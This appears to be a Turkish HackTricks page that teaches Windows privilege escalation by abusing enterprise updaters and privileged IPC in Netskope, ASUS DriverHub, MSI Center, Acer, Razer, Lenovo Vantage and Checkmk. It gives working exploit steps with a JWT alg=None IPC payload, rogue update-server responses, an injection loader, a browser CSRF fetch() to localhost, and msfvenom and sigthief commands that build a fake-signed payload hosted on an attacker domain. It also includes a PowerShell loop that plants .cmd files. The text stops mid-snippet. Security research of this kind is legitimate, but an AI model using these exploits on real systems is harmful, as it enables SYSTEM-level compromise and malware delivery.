# Kurumsal Otomatik Güncelleyicileri ve Privileged IPC'yi Kötüye Kullanma (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük sürtünmeli bir IPC yüzeyi ve ayrıcalıklı bir güncelleme akışı sunan kurumsal uç nokta aracıları ve güncelleyicilerde görülen bir Windows yerel ayrıcalık yükseltme zinciri sınıfını genelleştirir. Temsili bir örnek, düşük ayrıcalıklı bir kullanıcının kaydı saldırganın kontrolündeki bir sunucuya yönlendirebildiği ve ardından SYSTEM hizmetinin kötü amaçlı bir MSI yüklemesini sağlayabildiği, Windows için R129'dan eski Netskope Client'tır (CVE-2025-0309).<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Benzer ürünlere karşı yeniden kullanabileceğiniz temel fikirler:
- Yeniden kaydı veya yapılandırmayı saldırganın sunucusuna yönlendirmek için ayrıcalıklı bir hizmetin localhost IPC'sini kötüye kullanın.
- Üreticinin güncelleme uç noktalarını uygulayın, hileli bir Trusted Root CA sunun ve güncelleyiciyi kötü amaçlı, “imzalı” bir pakete yönlendirin.
- Zayıf imzalayan denetimlerini (CN izin listeleri), isteğe bağlı digest bayraklarını ve gevşek MSI özelliklerini aşın.
- IPC “şifrelenmişse”, kayıt defterinde herkesin okuyabildiği makine tanımlayıcılarından anahtarı/IV'yi türetin.
- Hizmet çağıranları görüntü yoluna/süreç adına göre kısıtlıyorsa, izin verilen bir sürece inject edin veya bir süreci askıya alınmış durumda başlatıp DLL'nizi minimal bir thread-context yamasıyla yükleyin.

Özel yerel TCP hizmetleri de PIN veya başka bir uygulama kimlik bilgisi gerektirse bile aynı kimlik ve girdi sınırı incelemesine tabi tutulmalıdır. Listener'ı süreç ve etkin hizmet hesabıyla eşleştirin; ardından dağıtılmış ikili dosyanın/sürümün tam olarak ne olduğunu ve çağıranın kontrolündeki alanların sabit boyutlu arabelleklere kopyalanmadan veya bir alt süreç komutu oluşturmak için kullanılmadan önce uzunluklarının denetlenip denetlenmediğini inceleyin. [Microsoft'un buffer-overrun kılavuzu](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns), ayrıcalıklı yerel kodda denetlenmeyen harici girdilerin neden tehlikeli olduğunu açıklar. Bir loopback listener, hardcoded kimlik bilgisi veya tek başına süreç adı; bellek bozulmasını ya da SYSTEM yürütmesini kanıtlamaz. Erişilebilirlik, yetkilendirme, kod yolu ve azaltıcı önlemler ayrı ayrı değerlendirilmelidir. Canlı bir hizmete çökmeye yol açabilecek uzunlukta girdiler göndermek yerine rutin numaralandırmayı pasif tutun.

---
## 1) Localhost IPC üzerinden kaydı saldırganın sunucusuna yönlendirme

Birçok aracı, localhost TCP üzerinden JSON kullanarak SYSTEM hizmetiyle iletişim kuran bir kullanıcı modu UI süreciyle birlikte gelir.

Netskope'ta gözlemlenenler:
- UI: stAgentUI (düşük bütünlük) ↔ Hizmet: stAgentSvc (SYSTEM)
- IPC komut kimliği 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend ana bilgisayarını kontrol eden (örn. AddonUrl) claim'lere sahip bir JWT kayıt token'ı oluşturun. İmza gerekmemesi için alg=None kullanın.
2) Provisioning komutunu çağıran IPC mesajını JWT'niz ve tenant adıyla gönderin:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Hizmet, kayıt/yapılandırma için sizin rogue server'ınıza istek göndermeye başlar; örneğin:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Çağıran doğrulaması path/name tabanlıysa isteği allow-list'e alınmış bir vendor binary'den başlatın (bkz. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Ağdan erişilebilen yönetim IPC'si

Bu güven sınırı her zaman localhost ile sınırlı değildir. Bildirilen MyReport Updater 2.1.1 vakasında, bir `LocalSystem` hizmeti tüm arayüzlerde dinliyor ve referans host, port ve çalışma modu için kimlik doğrulaması gerektirmeyen bir gRPC yapılandırma değişikliğini kabul ediyordu. Uzaktan gerçekleştirilen varyant için hem dinleyiciye ağ erişimi hem de hizmetten seçilen referansa giden erişim gerekiyordu. Bunları, sonraki paket akışının dosya yazma sınırını aşıp aşamayacağından ayrı olarak değerlendirin.<sup>[[16]](#references)</sup>

---
## 2) SYSTEM olarak kod çalıştırmak için güncelleme kanalını ele geçirmek

İstemci sizin server'ınızla iletişim kurduğunda beklenen endpoint'leri uygulayın ve istemciyi saldırganın MSI dosyasına yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir updater aralığı içeren JSON yapılandırması döndürün; örneğin:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA sertifikası döndürün. Hizmet bunu Local Machine Trusted Root deposuna yükler.
3) /v2/checkupdate → Kötü amaçlı bir MSI'ye ve sahte bir sürüme işaret eden metadata sağlayın.

Gerçek ortamlarda karşılaşılan yaygın kontrolleri aşma:
- Signer CN allow-list: hizmet yalnızca Subject CN'nin “netSkope Inc” veya “Netskope, Inc.” değerine eşit olup olmadığını kontrol ediyor olabilir. Sahte CA'nız bu CN değerine sahip bir leaf sertifika oluşturup MSI'yi imzalayabilir.
- CERT_DIGEST özelliği: CERT_DIGEST adlı zararsız bir MSI özelliği ekleyin. Yükleme sırasında bu değer doğrulanmaz.
- İsteğe bağlı digest denetimi: yapılandırma bayrağı (ör. check_msi_digest=false) ek kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM hizmeti MSI'nizi
C:\ProgramData\Netskope\stAgent\data\*.msi
konumundan yükleyerek NT AUTHORITY\SYSTEM olarak keyfi kod çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass dersi: Bir üretici, güncelleme kaynağını kriptografik olarak doğrulamak yerine az sayıda “güvenilir” domain'i allow-list'e ekleyerek yanıt verirse trafiği yönlendirmenize hâlâ izin veren, üreticiye ait redirector veya reverse proxy'leri araştırın. Netskope örneğinde, kamuya açık takip araştırmaları R129 dönemi allow-list'inin, saldırganın kontrolündeki Azure App Service içeriğini proxy'leyen `rproxy.goskope.com` üzerinden hâlâ istismar edilebildiğini gösterdi. Hostname allow-list'lerini güven sınırı değil, aşılması gereken bir engel olarak değerlendirin.<sup>[[14]](#references)</sup>

Bir diğer hata türü de **kendi içinde tutarlı ancak kimliği doğrulanmamış paket metadata'sıdır**. MyReport vakasında, saldırganın kontrolündeki bir referans değiştirilmiş bir arşiv sunarken aradaki bir sistem, üreticinin MD5 digest ve boyut yanıtlarını updater'a ulaşmadan önce değiştirdi. Bu değerlerin eşleşmesi yanıt tutarlılığını doğruluyordu, üretici kaynağını değil; MD5 çakışmasına gerek yoktu. Çağıranın belirlediği bir yükleme dizini de ayrıcalıklı çıkarma işlemini bir dosya yazma sınırına dönüştürdü. Sonuçta ortaya çıkan DLL yükleme primitive'i, [keyfi bir dosya yazımını DLL hijacking'e zincirleme](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) bölümünde ele alınmıştır.<sup>[[16]](#references)</sup>

---
## 3) Şifrelenmiş IPC isteklerini sahte olarak oluşturma (varsa)

R127'den itibaren Netskope, IPC JSON'u Base64 gibi görünen bir encryptData alanına sarmaladı. Tersine mühendislik, anahtarın/IV'nin herhangi bir kullanıcının okuyabildiği registry değerlerinden türetildiği AES kullanımını ortaya çıkardı:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi yeniden oluşturup standart bir kullanıcıdan geçerli şifrelenmiş komutlar gönderebilir.<sup>[[1]](#references)[[2]](#references)</sup> Genel ipucu: Bir agent aniden IPC'sini “şifrelemeye” başlarsa HKLM altında malzeme olarak kullanılan cihaz kimliklerini, ürün GUID'lerini ve kurulum kimliklerini araştırın.

---
## 4) IPC çağıran allow-list'lerini aşma (yol/ad denetimleri)

Bazı hizmetler, TCP bağlantısının PID'sini bulup görüntü yolu/adını Program Files altındaki allow-list'e alınmış üretici ikili dosyalarıyla (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak eşin kimliğini doğrulamaya çalışır.

İki pratik bypass:
- Allow-list'e alınmış bir sürece (ör. nsdiag.exe) DLL injection yapıp IPC proxy'sini bu süreç içinden kullanmak.
- Sürücünün uyguladığı müdahale önleme kurallarını karşılamak için allow-list'e alınmış bir ikili dosyayı askıya alınmış olarak başlatıp CreateRemoteThread kullanmadan proxy DLL'nizi başlatmak (§5'e bakın).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Müdahale korumasına uygun injection: askıya alınmış süreç + NtContinue patch'i

Ürünler, korunan süreçlere ait handle'lardan tehlikeli hakları kaldırmak için genellikle bir minifilter/OB callbacks sürücüsü (ör. Stadrv) içerir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE haklarıyla sınırlar

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) Bir üretici ikili dosyasını CREATE_SUSPENDED ile CreateProcess kullanarak başlatın.
2) Hâlâ kullanmanıza izin verilen handle'ları alın: süreçte PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve thread'de THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya kodu bilinen bir RIP konumunda patch'liyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue (veya başka bir erken aşamada yüklendiği garanti edilen thunk) üzerine DLL yolunuzda LoadLibraryW çağıran ve ardından geri dönen küçük bir stub yazın.
4) Stub'ı süreç içinde çalıştırıp DLL'nizi yüklemek için ResumeThread çağırın.

Zaten korunan bir süreçte PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınızdan (süreci siz oluşturduğunuzdan), sürücünün politikası karşılanır.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Pratik araçlar
- NachoVPN (Netskope plugin), sahte CA oluşturma, kötü amaçlı MSI imzalama ve gereken endpoint'leri sunma işlemlerini otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope, keyfi (isteğe bağlı olarak AES ile şifrelenmiş) IPC mesajları oluşturan ve allow-list'e alınmış bir ikili dosyadan istek göndermek için askıya alınmış süreç injection'ını içeren özel bir IPC client'tır.<sup>[[4]](#references)</sup>

## 7) Bilinmeyen updater/IPC yüzeyleri için hızlı triage iş akışı

Yeni bir endpoint agent veya anakart “yardımcı” paketiyle karşılaştığınızda, umut vadeden bir privesc hedefiyle karşı karşıya olup olmadığınızı anlamak için genellikle hızlı bir iş akışı yeterlidir:<sup>[[6]](#references)</sup>

1) Loopback listener'larını numaralandırın ve bunları üretici süreçleriyle eşleştirin:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Aday named pipe'ları listeleyin:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Eklenti tabanlı IPC sunucuları tarafından kullanılan kayıt defteri destekli yönlendirme verilerini çıkar:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Önce user-mode client'tan endpoint adlarını, JSON anahtarlarını ve komut kimliklerini çıkarın. Paketlenmiş Electron/.NET frontend'ler sıklıkla şemanın tamamını leak eder:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Yalnızca süreci sonunda başlatan code path'i değil, gerçek güven koşulunu araştırın:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Öncelik vermeye değer örüntüler:
- `CryptQueryObject`/sertifika ayrıştırma işlemi `WinVerifyTrust` olmadan kullanılıyorsa, genellikle “sertifika mevcut” ifadesi “sertifika güvenilir” olarak değerlendirilmiştir; bu da sertifika klonlamayı veya sahte imzalayıcıya yönelik diğer yöntemleri mümkün kılar.
- `Origin`, `Referer`, indirme URL’leri, işlem adları veya imzalayan CN’leri üzerinde yapılan alt dize/son ek denetimleri kimlik doğrulama değildir. `contains(".vendor.com")` denetimi, saldırganın kontrolündeki benzer görünümlü alan adlarıyla genellikle istismar edilebilir.
- Düşük yetkili GUI “dosya güvenilir” kararını veriyor ve SYSTEM broker yalnızca bu sonucu kullanıyorsa, istemci tarafındaki DLL/JS’yi yamalamak veya yeniden uygulamak sınırı tamamen aşabilir (Razer tarzı bölünmüş doğrulama).
- Broker bir payload’ı `%TEMP%`/`C:\Windows\Temp` konumuna kopyalayıp ardından bu yoldan doğruluyor veya zamanlıyorsa, TOCTOU değiştirme aralıklarını ve daha zayıf denetimlere sahip alternatif `ExecuteTask()` sarmalayıcıları sunan kardeş eklenti modüllerini hemen test edin.<sup>[[6]](#references)</sup>

Adlandırılmış kanal kullanan hedeflerde, protokolü ayrıntılı olarak tersine mühendisliğe başlamadan önce zayıf DACL’leri ve uzaktan erişilebilen kanalları tespit etmek için PipeViewer hızlı bir yöntemdir.<sup>[[11]](#references)</sup>

Hedef arayanları yalnızca PID, imaj yolu veya işlem adına göre doğruluyorsa, bunu bir sınırdan ziyade küçük bir engel olarak değerlendirin: meşru istemciye kod enjekte etmek veya bağlantıyı izin verilenler listesindeki bir işlemden kurmak genellikle sunucunun denetimlerini geçmeye yeterlidir. Özellikle adlandırılmış kanallar için, [istemci kimliğine bürünme ve kanalın kötüye kullanımı hakkındaki bu sayfa](named-pipe-client-impersonation.md) temel tekniği daha ayrıntılı ele alır.

Ayrıcalıklı bir **temizleme veya geri yükleme broker’ı** söz konusuysa, kanal ACL’sinin yanı sıra yol güven sınırını da inceleyin. Daha düşük yetkili bir arayan, hizmet yürütülebilir dosyası ve kurulum dizini korumalı olsa bile paylaşılan bir dizindeki geri yükleme hedefini seçebilir veya aşamalandırılmış bir yedekleme dosyasının adını değiştirebilir. Arayanın geri yükleme komutuna erişebildiğini, tam olarak aşamalandırılmış girdiyi veya dosya adını değiştirebildiğini, broker’ın daha yüksek bir kimlikle çalıştığını ve geri yükleme işleminin seçilen korumalı yola gerçekten yazdığını ayrı ayrı doğrulayın. Yazılabilir bir aşamalandırma dizini veya okunabilir bir kanal tek başına rastgele ayrıcalıklı yazma olanağını kanıtlamaz; hedef eşlemesi ve hizmet davranışı kod incelemesiyle veya kontrollü testlerle doğrulanmalıdır. Pasif keşif sırasında bilinmeyen bir temizleme komutunu çalıştırmayın; kullanıcı dosyalarını silebilir.

---
## 8) Yalnızca üretici imzalarını doğrulayan modüler eklenti broker’ları (Lenovo Vantage örüntüsü)

Araştırmaya değer yeni bir varyasyon **imzalı istemci RPC broker’ı** örüntüsüdür: düşük yetkili, Lenovo imzalı bir masaüstü işlemi SYSTEM hizmetiyle iletişim kurar ve hizmet JSON komutlarını `%ProgramData%` altındaki XML ile tanımlanmış bir eklenti kümesine yönlendirir. Kabul edilen herhangi bir imzalı istemcinin **içinde kod yürütme** sağlandığında, `runas="system"` sözleşmelerinin her biri saldırı yüzeyinizin parçası olur.<sup>[[15]](#references)</sup>

Lenovo Vantage araştırmalarında gözlemlenen değerli temel teknikler:
- **Arayana üretici tarafından imzalandığı için güvenmek**: Araştırmacılar, yazılabilir bir dizine Lenovo imzalı bir EXE kopyalayıp DLL side-load (`profapi.dll`) koşulunu sağlayarak; hizmetin zaten güvendiği bir istemci içinde rastgele kod çalıştırarak kimliği doğrulanmış bir bağlama ulaştı.
- **Manifest odaklı saldırı yüzeyi keşfi**: Eklentiler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; birkaç sözleşme `SYSTEM` olarak çalışır. Bu nedenle bu manifestleri listelemek, broker’ın kendisini tersine mühendisliğe tabi tutmaktan daha hızlı biçimde gerçek ayrıcalıklı fiilleri ortaya çıkarır.
- **Kimliği doğrulanmış kanalın arkasındaki komut başına hatalar**: Güvenilen istemcinin içinde olunduktan sonra, kamuya açık araştırmalar güncelleme/kurulum fiillerinde yol geçişi + yarış koşulları, ayrıcalıklı ayarlar veritabanlarında ham SQL kötüye kullanımı ve amaçlanan hive’ın dışına yazmaya olanak tanıyan alt dize tabanlı kayıt defteri yolu denetimleri buldu.

Bir hedefte işinize yarayacak keşif:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Pratik çıkarım: Bir yardımcı araç paketi önce **çağıran süreci** doğrulayan, ardından onlarca plugin/add-in komutuna yönlendirme yapan bir broker sunuyorsa, yalnızca girişteki güven denetimini atlatmakla yetinmeyin. Manifest/contract tablosunu dökümleyin ve yüksek ayrıcalıklı her fiili bağımsız olarak fuzz edin; kimliği doğrulanmış kanal genellikle ikinci aşamada birkaç hatayı gizler.

---
## 1) Ayrıcalıklı HTTP API'lerine karşı tarayıcıdan localhost'a CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 adresinde, tarayıcıdan gelen çağrıların https://driverhub.asus.com adresinden gelmesini bekleyen bir kullanıcı kipi HTTP hizmeti (ADU.exe) sunar. Origin filtresi, Origin başlığında ve `/asus/v1.0/*` üzerinden sunulan indirme URL'lerinde yalnızca `string_contains(".asus.com")` denetimi yapar. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi saldırganın kontrolündeki herhangi bir ana makine bu denetimi geçer ve JavaScript üzerinden durum değiştiren istekler gönderebilir.<sup>[[6]](#references)</sup> Ek atlatma yöntemleri için [CSRF temelleri](../../pentesting-web/csrf-cross-site-request-forgery.md) sayfasına bakın.

Pratik akış:
1) `.asus.com` içeren bir alan adı kaydedin ve burada kötü amaçlı bir web sayfası barındırın.
2) `http://127.0.0.1:53000` adresindeki ayrıcalıklı bir uç noktayı (ör. `Reboot`, `UpdateApp`) çağırmak için `fetch` veya XHR kullanın.
3) İşleyicinin beklediği JSON gövdesini gönderin — paketlenmiş frontend JS aşağıdaki şemayı gösterir.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Aşağıda gösterilen PowerShell CLI bile, Origin header güvenilir değere spoof edildiğinde başarılı olur:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Herhangi bir tarayıcı ziyareti, saldırgan sitesine yapılan 1 tıklamalı (veya `onload` aracılığıyla 0 tıklamalı) ve SYSTEM yetkili bir yardımcıyı çalıştıran yerel CSRF saldırısına dönüşür.

---
## 2) Güvenli olmayan kod imzası doğrulaması ve sertifika klonlama (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`, JSON gövdesinde tanımlanan rastgele yürütülebilir dosyaları indirir ve `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` konumunda önbelleğe alır. İndirme URL’si doğrulaması aynı alt dize mantığını kullandığından `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirme sonrasında ADU.exe, çalıştırmadan önce yalnızca PE dosyasının imza içerip içermediğini ve Subject dizgesinin ASUS ile eşleşip eşleşmediğini kontrol eder; `WinVerifyTrust` veya sertifika zinciri doğrulaması yapmaz.

Bu akışı silahlandırmak için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS’un imzalayan sertifikasını payload’a klonlayın (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir etki alanında barındırın ve yukarıdaki tarayıcı CSRF yöntemiyle UpdateApp’i tetikleyin.

Hem Origin hem de URL filtreleri alt dize tabanlı olduğundan ve imzalayan denetimi yalnızca dizeleri karşılaştırdığından DriverHub, saldırganın ikilisini yükseltilmiş bağlamda indirip çalıştırır.<sup>[[6]](#references)</sup>

---
## 1) Güncelleyicinin kopyalama/çalıştırma yollarında TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center’ın SYSTEM hizmeti, her çerçevenin `4-byte ComponentID || 8-byte CommandID || ASCII arguments` biçiminde olduğu bir TCP protokolü sunar. Temel bileşen (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` komutunu içerir. İşleyicisi:
1) Sağlanan yürütülebilir dosyayı `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) İmzayı `CS_CommonAPI.EX_CA::Verify` aracılığıyla doğrular (sertifika Subject değeri “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Geçici dosyayı saldırgan denetimindeki argümanlarla SYSTEM olarak çalıştıran bir zamanlanmış görev oluşturur.

Kopyalanan dosya, doğrulama ile `ExecuteTask()` arasında kilitlenmez. Bir saldırgan şunları yapabilir:
- Frame A’yı, imza denetiminin geçmesini ve görevin kuyruğa alınmasını garanti eden, MSI imzalı meşru bir ikiliyi gösterecek şekilde gönderir.
- Doğrulama tamamlandıktan hemen sonra `MSI Center SDK.exe` dosyasını kötü amaçlı bir payload ile üzerine yazarak, tekrarlanan Frame B mesajlarıyla yarışır.

Zamanlayıcı çalıştığında, özgün dosya doğrulanmış olmasına rağmen üzerine yazılan payload’ı SYSTEM yetkisiyle çalıştırır. Güvenilir exploit için TOCTOU aralığı kazanılana kadar CMD_AutoUpdateSDK komutunu spam’leyen iki goroutine/thread kullanılır.<sup>[[6]](#references)</sup>

---
## 2) Özel SYSTEM düzeyindeki IPC ve kimliğe bürünme mekanizmalarını kötüye kullanma (MSI Center + Acer Control Centre)

### MSI Center TCP komut kümeleri
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Çerçevenin ilk 4 baytı bileşeni seçerek saldırganların komutları rastgele modüllere yönlendirmesine olanak tanır.
- Plugin’ler kendi görev çalıştırıcılarını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` komutunu sunar ve **imza doğrulaması yapmadan** doğrudan `API_Support.EX_Task::ExecuteTask()` çağrısı yapar; herhangi bir yerel kullanıcı `C:\Users\<user>\Desktop\payload.exe` dosyasını göstererek kesin olarak SYSTEM yetkisiyle kod çalıştırabilir.
- Wireshark ile loopback trafiğini dinlemek veya .NET ikililerini dnSpy’da incelemek, Bileşen ↔ komut eşleşmesini hızla ortaya çıkarır; ardından özel Go/Python istemcileri çerçeveleri yeniden gönderebilir.<sup>[[6]](#references)</sup>

### Acer Control Centre adlı kanalları ve kimliğe bürünme düzeyleri
- SYSTEM yetkili `ACCSvc.exe`, `\\.\pipe\treadstone_service_LightMode` adlı kanalı sunar ve isteğe bağlı erişim denetim listesi uzaktaki istemcilere (ör. `\\TARGET\pipe\treadstone_service_LightMode`) izin verir. Dosya yolu içeren 7 komut kimliğinin gönderilmesi, hizmetin süreç başlatma yordamını çağırır.
- İstemci kütüphanesi, argümanlarla birlikte 113 değerindeki özel sonlandırıcı baytı serileştirir. Frida/`TsDotNetLib` ile dinamik enstrümantasyon (enstrümantasyon ipuçları için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümüne bakın), yerel işleyicinin `CreateProcessAsUser` çağrısından önce bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve bütünlük SID’sine eşlediğini gösterir.
- 113 (`0x71`) yerine 114 (`0x72`) kullanıldığında, tam SYSTEM token’ını koruyan ve yüksek bütünlük SID’si (`S-1-16-12288`) ayarlayan genel dala geçilir. Böylece başlatılan ikili hem yerel makinede hem de makineler arası, kısıtlamasız SYSTEM olarak çalışır.
- Bunu, ACC’yi laboratuvar VM’lerinde bile kurup kanal üzerinden denemeler yapmayı sağlayan açık yükleyici seçeneğiyle (`Setup.exe -nocheck`) birleştirin.<sup>[[6]](#references)</sup>

Bu IPC açıkları, localhost hizmetlerinin neden karşılıklı kimlik doğrulaması (ALPC SID’leri, `ImpersonationLevel=Impersonation` filtreleri, token filtreleme) uygulaması gerektiğini ve her modülün “rastgele ikili çalıştırma” yardımcısının aynı imzalayan doğrulamalarını kullanmasının neden önemli olduğunu gösterir.

---
## 3) Zayıf kullanıcı modu doğrulamasını kullanan COM/IPC “elevator” yardımcıları (Razer Synapse 4)

Razer Synapse 4, bu örüntü ailesine başka bir kullanışlı örnek ekledi: düşük ayrıcalıklı bir kullanıcı, `RzUtility.Elevator` aracılığıyla süreç başlatması için bir COM yardımcısından istekte bulunabilir; ancak güven kararı, ayrıcalıklı sınır içinde sağlam biçimde uygulanmak yerine bir kullanıcı modu DLL’si (`simple_service.dll`) tarafından verilir.

Gözlemlenen exploit akışı:
- `RzUtility.Elevator` COM nesnesini örnekleyin.
- Yükseltilmiş bir başlatma isteğinde bulunmak için `LaunchProcessNoWait(<path>, "", 1)` çağrısını yapın.
- Herkese açık PoC’de, isteği göndermeden önce `simple_service.dll` içindeki PE imza denetimi devre dışı bırakılır ve böylece saldırganın seçtiği rastgele bir yürütülebilir dosya başlatılabilir.<sup>[[6]](#references)[[10]](#references)</sup>

En temel PowerShell çağrısı:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Genel çıkarım: “helper” paketlerini tersine mühendislik yaparken yalnızca localhost TCP veya named pipe'leri incelemekle yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM sınıflarını kontrol edin ve ayrıcalıklı hizmetin hedef binary'yi gerçekten doğrulayıp doğrulamadığını ya da yalnızca yamalanabilir bir user-mode client DLL tarafından hesaplanan sonuca güvenip güvenmediğini teyit edin. Bu örüntü Razer'ın ötesinde de geçerlidir: yüksek ayrıcalıklı broker'ın düşük ayrıcalıklı taraftan gelen bir izin/ret kararını kullandığı her bölünmüş tasarım, privesc için olası bir saldırı yüzeyidir.


---
## MSI onarımı sırasında öngörülebilir geçici script yürütme (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent'ları hâlâ ayrıcalıklı işlemleri `C:\Windows\Temp` dizinine geçici bir `.cmd` dosyası yazıp bunu `SYSTEM` olarak yürüterek gerçekleştiriyor. Dosya adı öngörülebilirse ve hizmet mevcut dosyaları güvenli biçimde yeniden oluşturmuyorsa düşük ayrıcalıklı bir kullanıcı, gelecekte kullanılacak geçici dosyayı **salt okunur** olarak önceden oluşturabilir ve ayrıcalıklı sürecin kendi script'i yerine saldırganın denetimindeki içeriği yürütmesini sağlayabilir.

Güvenlik açığı bulunan Checkmk Agent derlemelerinde gözlemlenenler:
- geçici dosya kalıbı: `cmk_all_<PID>_1.cmd`
- etkilenen dallar: `2.0.0`, `2.1.0`, `2.2.0`
- tetikleyici: önbelleğe alınmış agent paketinin MSI **onarımı**<sup>[[8]](#references)[[9]](#references)</sup>

Uygulama adımları:
1. Mevcut process ID'lerinden veya çalışan agent PID'sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` yönlendirmesi kullanın; batch dosyaları için UTF-16 PowerShell çıktısından kaçının).
3. Aday aralıktaki `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyalarını oluşturup her birini salt okunur olarak işaretleyin.
4. Ayrıcalıklı hizmetin geçici script'i yeniden oluşturmayı denemesini ve ardından yürütmesini sağlamak için önbelleğe alınmış MSI'ın onarımını tetikleyin.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Savunmasız ürün Windows Installer ile yüklendiyse, onarımı başlatmadan önce `C:\Windows\Installer` altındaki rastgele görünen önbelleğe alınmış MSI dosyasının hangi ürün adına ait olduğunu bulun:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
